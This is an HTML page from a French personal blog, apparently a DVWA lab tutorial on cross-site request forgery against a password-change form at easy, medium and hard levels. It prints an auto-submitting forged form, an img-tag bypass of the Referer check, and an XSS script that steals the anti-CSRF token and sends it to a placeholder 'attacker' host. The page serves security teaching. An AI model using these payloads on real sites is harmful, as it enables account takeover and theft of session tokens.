@@ -1,0 +1,161 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src-attr 'unsafe-inline'">
+
+    <title>DVWA - CSRF | Theora59 Devs Adventures</title>
+
+    <link rel="preload" href="https://theora59-dev.github.io/blog/fonts/FiraCode-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    <link rel="preload" href="https://theora59-dev.github.io/blog/fonts/FiraCode-Bold.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://theora59-dev.github.io/blog/css/style.css?h=b15039a827e49a424ac9">
+    <script src="https://theora59-dev.github.io/blog/js/auto-close-popover-on-resize.js?h=4ef87d6fc7b98b22e044" defer></script>
+    <script src="https://theora59-dev.github.io/blog/js/copy-code-to-clipboard.js?h=6aac77c47d552a0ac847" defer></script>
+
+    <link rel="canonical" href="https://theora59-dev.github.io/blog/cours/csrf/">
+    
+    <meta name="description" content="Explication technique">
+    <meta name="robots" content="index, follow">
+    <meta name="theme-color" content="#211f1a">
+    <meta name="color-scheme" content="dark">
+
+    <meta property="og:title" content="DVWA - CSRF">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://theora59-dev.github.io/blog/cours/csrf/">
+    <meta property="og:description" content="Explication technique">
+    <meta property="og:site_name" content="Theora59 Devs Adventures">
+    <meta property="og:updated_time" content="2025-12-23T16:51:21.836163978+01:00">
+    <meta property="article:published_time" content="2025-12-23T00:00:00+00:00">
+    <meta property="article:tag" content="cybersécurité">
+    <meta property="article:tag" content="DVWA">
+    <meta property="article:tag" content="web">
+</head>
+
+<body class="layout-center">
+    <header class="header">
+        <div class="header-container">
+            <span class="header-logo-container">
+                <a href="https://theora59-dev.github.io/blog">
+                    <span class="logo">Theora59 Devs Adventures</span>
+                </a>
+            </span>
+        </div>
+        <nav class="main-menu" aria-label="Main Menu">
+            <a class="skip-to-content" href="#main">Skip to main content</a>
+            <button class="main-menu-dropdown-button" popovertarget="nav-menu">Menu</button>
+            <ul id="nav-menu" class="main-menu-items" aria-label="Site Navigation" popover>
+                <li><a href="https://theora59-dev.github.io/blog/">Accueil</a></li>
+                <li><a href="https://theora59-dev.github.io/blog/projets/">Projets</a></li>
+                <li><a href="https://theora59-dev.github.io/blog/cours/">Cours</a></li>
+                <li><a href="https://theora59-dev.github.io/blog/tags/">Tags</a></li>
+                <li><a href="https://github.com/Theora59-dev/" target="_blank">Github</a></li>
+            </ul>
+        </nav>
+    </header>
+    <main id="main">
+        <article class="post content">
+            <header>
+                <h1 class="post-title">
+                    <a href="https://theora59-dev.github.io/blog/cours/csrf/">DVWA - CSRF</a>
+                </h1>
+                <ul class="post-meta hidden">
+                    <li title="Published on 2025-12-23"><time datetime="2025-12-23">2025.12.23</time></li>
+                    <li role="separator" aria-hidden="true">::</li>
+                    <li title="184 words"><time datetime="PT1M">1 min</time> read</li>
+                </ul>
+                <div class="post-tags">
+                    <span>#<a rel="tag" href="https://theora59-dev.github.io/blog/tags/cybersecurite/">cybersécurité</a></span>
+                    <span>#<a rel="tag" href="https://theora59-dev.github.io/blog/tags/dvwa/">DVWA</a></span>
+                    <span>#<a rel="tag" href="https://theora59-dev.github.io/blog/tags/web/">web</a></span>
+                </div>
+            </header>
+
+<blockquote>
+<p>DVWA simule les attaques CSRF (Cross-Site Request Forgery) via un formulaire de changement de mot de passe sans protections adéquates. L'objectif est de forcer un utilisateur authentifié à modifier son mot de passe sans son consentement, en exploitant la confiance basée sur les cookies de session.</p>
+</blockquote>
+<h2 id="easy">Easy</h2>
+<p>Aucune protection : capturez la requête POST vers <code>vulnerabilities/csrf/</code> via Burp ou DevTools (méthode POST, <code>password_new=pwned</code>, <code>password_conf=pwned</code>).</p>
+<ul>
+<li>
+<p>Créez <code>csrf.html</code> avec:</p>
+<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>&lt;</span><span style="color:#bf616a;">form </span><span style="color:#d08770;">action</span><span>=&quot;</span><span style="color:#a3be8c;">http://dvwa/csrf.php</span><span>&quot; </span><span style="color:#d08770;">method</span><span>=&quot;</span><span style="color:#a3be8c;">POST</span><span>&quot;&gt;
+</span><span>    &lt;</span><span style="color:#bf616a;">input </span><span style="color:#d08770;">type</span><span>=&quot;</span><span style="color:#a3be8c;">hidden</span><span>&quot; </span><span style="color:#d08770;">name</span><span>=&quot;</span><span style="color:#a3be8c;">password_new</span><span>&quot; </span><span style="color:#d08770;">value</span><span>=&quot;</span><span style="color:#a3be8c;">pwned</span><span>&quot; /&gt;&lt;</span><span style="color:#bf616a;">input
+</span><span>        </span><span style="color:#d08770;">type</span><span>=&quot;</span><span style="color:#a3be8c;">hidden</span><span>&quot;
+</span><span>        </span><span style="color:#d08770;">name</span><span>=&quot;</span><span style="color:#a3be8c;">password_conf</span><span>&quot;
+</span><span>        </span><span style="color:#d08770;">value</span><span>=&quot;</span><span style="color:#a3be8c;">pwned</span><span>&quot;
+</span><span>    /&gt;&lt;</span><span style="color:#bf616a;">input </span><span style="color:#d08770;">type</span><span>=&quot;</span><span style="color:#a3be8c;">submit</span><span>&quot; </span><span style="color:#d08770;">value</span><span>=&quot;</span><span style="color:#a3be8c;">Cliquez</span><span>&quot; /&gt;
+</span><span>&lt;/</span><span style="color:#bf616a;">form</span><span>&gt;
+</span><span>&lt;</span><span style="color:#bf616a;">script</span><span>&gt;
+</span><span>    document.forms[</span><span style="color:#d08770;">0</span><span>].</span><span style="color:#bf616a;">submit</span><span>();
+</span><span>&lt;/</span><span style="color:#bf616a;">script</span><span>&gt;
+</span></code></pre>
+</li>
+<li>
+<p>Servez la page à la victime loggée : le navigateur soumet automatiquement avec ses cookies, modifiant le mot de passe.</p>
+</li>
+</ul>
+<h2 id="medium">Medium</h2>
+<ul>
+<li>Vérifie $_SERVER['HTTP_REFERER'] pour matcher le domaine DVWA, bloquant les requêtes externes directes.</li>
+<li>On peut le Bypass via <code>&lt;img src="http://dvwa/vulnerabilities/csrf/?password_new=pwned&amp;password_conf=pwned&amp;user_token=xxx"&gt;</code> (GET forcé par img src, referer absent ou spoofable).</li>
+<li>Ou utilisez un formulaire POST avec JS pour définir document.referrer via meta-refresh, préservant le referer DVWA lors du submit.</li>
+</ul>
+<h2 id="hard">Hard</h2>
+<ul>
+<li>
+<p>Génère un token unique (user_token) validé côté serveur + referer check.
+Exploitez via XSS Stored/Reflected pour voler le token : injectez:</p>
+<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>&lt;</span><span style="color:#bf616a;">script</span><span>&gt;
+</span><span>    </span><span style="color:#bf616a;">fetch</span><span>(&quot;</span><span style="color:#a3be8c;">http://dvwa/guestbook/</span><span>&quot;)
+</span><span>      .</span><span style="color:#bf616a;">then</span><span>((r) </span><span style="color:#b48ead;">=&gt; </span><span style="color:#bf616a;">r</span><span>.</span><span style="color:#bf616a;">text</span><span>())
+</span><span>      .</span><span style="color:#bf616a;">then</span><span>((t) </span><span style="color:#b48ead;">=&gt;
+</span><span>        </span><span style="color:#bf616a;">fetch</span><span>(</span><span style="color:#bf616a;">t</span><span>.</span><span style="color:#bf616a;">match</span><span>(/</span><span style="color:#96b5b4;">name=</span><span style="color:#d08770;">[&#39;&quot;]</span><span style="color:#96b5b4;">user_token</span><span style="color:#d08770;">[&#39;&quot;]</span><span style="color:#96b5b4;"> value=</span><span style="color:#d08770;">[&#39;&quot;]</span><span style="color:#96b5b4;">(</span><span style="color:#d08770;">[</span><span>^</span><span style="color:#d08770;">&#39;&quot;]</span><span>+</span><span style="color:#96b5b4;">)</span><span style="color:#d08770;">[&#39;&quot;]</span><span>/)[</span><span style="color:#d08770;">1</span><span>])
+</span><span>          .</span><span style="color:#bf616a;">then</span><span>((r) </span><span style="color:#b48ead;">=&gt; </span><span style="color:#bf616a;">r</span><span>.</span><span style="color:#bf616a;">text</span><span>())
+</span><span>          .</span><span style="color:#bf616a;">then</span><span>(
+</span><span>            (t) </span><span style="color:#b48ead;">=&gt;
+</span><span>              (document.location =
+</span><span>                &quot;</span><span style="color:#a3be8c;">http://attacker/csrf.html?token=</span><span>&quot; +
+</span><span>                </span><span style="color:#bf616a;">t</span><span>.</span><span style="color:#bf616a;">match</span><span>(
+</span><span>                  /</span><span style="color:#96b5b4;">name=</span><span style="color:#d08770;">[&#39;&quot;]</span><span style="color:#96b5b4;">user_token</span><span style="color:#d08770;">[&#39;&quot;]</span><span style="color:#96b5b4;"> value=</span><span style="color:#d08770;">[&#39;&quot;]</span><span style="color:#96b5b4;">(</span><span style="color:#d08770;">[</span><span>^</span><span style="color:#d08770;">&#39;&quot;]</span><span>+</span><span style="color:#96b5b4;">)</span><span style="color:#d08770;">[&#39;&quot;]</span><span>/,
+</span><span>                )[</span><span style="color:#d08770;">1</span><span>]),
+</span><span>        ),
+</span><span>      );
+</span><span>&lt;/</span><span style="color:#bf616a;">script</span><span>&gt;
+</span></code></pre>
+</li>
+<li>
+<p>La page attaquante récupère le token via URL param et soumet le formulaire dynamique :</p>
+<pre data-lang="javascript" style="background-color:#2b303b;color:#c0c5ce;" class="language-javascript "><code class="language-javascript" data-lang="javascript"><span style="color:#bf616a;">token </span><span>= new URLSearchParams(</span><span style="color:#bf616a;">location</span><span>.</span><span style="color:#bf616a;">search</span><span>).</span><span style="color:#96b5b4;">get</span><span>(&#39;</span><span style="color:#a3be8c;">token</span><span>&#39;); </span><span style="color:#bf616a;">form</span><span>.</span><span style="color:#bf616a;">user_token</span><span>.value=</span><span style="color:#bf616a;">token</span><span>; </span><span style="color:#bf616a;">form</span><span>.</span><span style="color:#96b5b4;">submit</span><span>();
+</span></code></pre>
+</li>
+</ul>
+
+        </article>
+        <nav class="post-navigation">
+            <header class="post-navigation-title">
+                <h2>Read More Posts</h2>
+                <hr>
+            </header>
+            <div class="post-navigation-buttons">
+                <a rel="next" href="https://theora59-dev.github.io/blog/cours/sql-injection/" aria-label="Next article">
+                    <span aria-hidden="true">&lt;&nbsp;[</span>DVWA - Injection SQL<span aria-hidden="true">]</span>
+                </a>
+                <span aria-hidden="true" role="separator">::</span>
+                <a rel="prev" href="https://theora59-dev.github.io/blog/cours/file-inclusion/" aria-label="Prev article">
+                    <span aria-hidden="true">[</span>DVWA - File Inclusion<span aria-hidden="true">]&nbsp;&gt;</span>
+                </a>
+            </div>
+        </nav>
+    </main>
+    <footer class="footer">
+        <p class="copyright">
+            <span>© <time>2025</time></span>
+            <span>Powered by <a href="https://www.getzola.org">Zola</a></span>
+            <span>Theme by <a href="https://eyalkalderon.com">ebkalderon</a></span>
+        </p>
+    </footer>
+</body>
+
+</html>
